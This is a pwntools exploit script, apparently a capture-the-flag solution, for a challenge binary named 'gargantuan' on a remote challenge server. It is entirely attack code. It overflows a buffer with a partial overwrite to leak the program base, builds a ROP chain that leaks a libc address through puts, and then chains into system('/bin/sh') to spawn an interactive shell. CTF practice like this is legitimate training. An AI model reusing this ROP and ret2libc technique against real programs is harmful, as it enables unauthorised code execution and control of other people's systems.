from pwn import *
from icecream import ic

elf = exe = ELF("./gargantuan_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("gargantuan.chal.cyberjousting.com", 1352)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# pie b 0x00000000000012a1
pie b 0x00000000000012d7
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

ru("Enter your input below:\n")

for i in range(4):
    payload = b'a'*255
    payload += b'\x00'
    payload += b'a'*255
    s(payload)
    sleep(0.1)


payload = b'a'*255
payload += b'\x00'
payload += b'a'*(50-6)
payload += b'\xe6\xe1'
s(payload)
sleep(0.1)

# s(b'a'*257)

ru("TOO LATE!")
elf.address = int(rl().strip().decode(), 16) - 0x11e5
ic(hex(elf.address))

for i in range(4):
    payload = b'a'*255
    payload += b'\x00'
    payload += b'a'*255
    s(payload)
    sleep(0.1)

pop_rdi = elf.address + 0x00000000000011e0
payload = b'a'*255
payload += b'\x00'
payload += cyclic(54-6-4)
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])
s(payload)
sleep(0.1)

rl()
libc.address = u64(rl().strip().ljust(8, b'\x00')) - 0x80e50
binsh = libc.address + 0x1d8678
ret = elf.address + 0x0000000000001016
ic(hex(libc.address))

for i in range(4):
    payload = b'a'*255
    payload += b'\x00'
    payload += b'a'*255
    s(payload)
    sleep(0.1)

payload = b'a'*255
payload += b'\x00'
payload += b'a'*(50-6)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.symbols['system'])
s(payload)
io.interactive()